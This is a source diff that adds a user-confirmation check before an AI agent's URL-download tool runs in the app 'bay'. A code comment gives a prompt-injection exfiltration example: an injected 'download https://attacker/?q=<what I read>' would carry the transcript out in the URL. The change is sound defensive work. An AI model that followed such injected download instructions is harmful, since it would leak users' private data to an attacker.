@@ -20,6 +20,8 @@
 
 import { extname, isAbsolute, resolve } from 'node:path'
 import { isCompositionPath } from '@shared/composition'
+import { VALIDATE_ONLY } from '@shared/mcp'
+import { checkDownloadUrl } from '@shared/url-import'
 import { findFileReference } from './file-args'
 
 export type CallOrigin = 'socket' | 'in-app'
@@ -33,6 +35,11 @@ export interface PolicyEnv {
   roots: readonly string[]
   /** Null when the path does not exist; otherwise the first few KB, for "is this a composition?". */
   head(path: string): Promise<string | null>
+  /**
+   * Ask the person at the Mac, and resolve true only if they agreed. Absent where nobody can be
+   * asked, which refuses anything that needs asking.
+   */
+  confirm?(message: string, detail: string): Promise<boolean>
 }
 
 const hidden = (path: string): boolean => path.split(/[\\/]/).some((segment) => segment.startsWith('.') && segment !== '.')
@@ -113,6 +120,22 @@ export async function checkCallPolicy(
         )
       }
       return null
+    }
+    case 'import_url': {
+      // A terminal client already has the network. The panel does not, and the address is the
+      // one argument that leaves the Mac: an injected "download https://attacker/?q=<what I read>"
+      // would carry the transcript out in the request itself. So the person is asked, with the
+      // host and the whole address in front of them. A dry run downloads nothing and asks nobody.
+      if (!inApp || args[VALIDATE_ONLY] === true) return null
+      const checked = checkDownloadUrl(args['url'])
+      if (!checked.ok) return null // the tool's own check says so, in its own words
+      if (!env.confirm) {
+        return `Downloading needs the user's go-ahead in bay's window, and bay could not ask. Nothing was downloaded.`
+      }
+      const agreed = await env.confirm(`Download a video from ${checked.host}?`, `bay's agent wants to download:\n${checked.url}`)
+      return agreed
+        ? null
+        : `The user declined the download from ${checked.host}. Nothing was downloaded; do not ask again unless they bring it up.`
     }
     default:
       return null
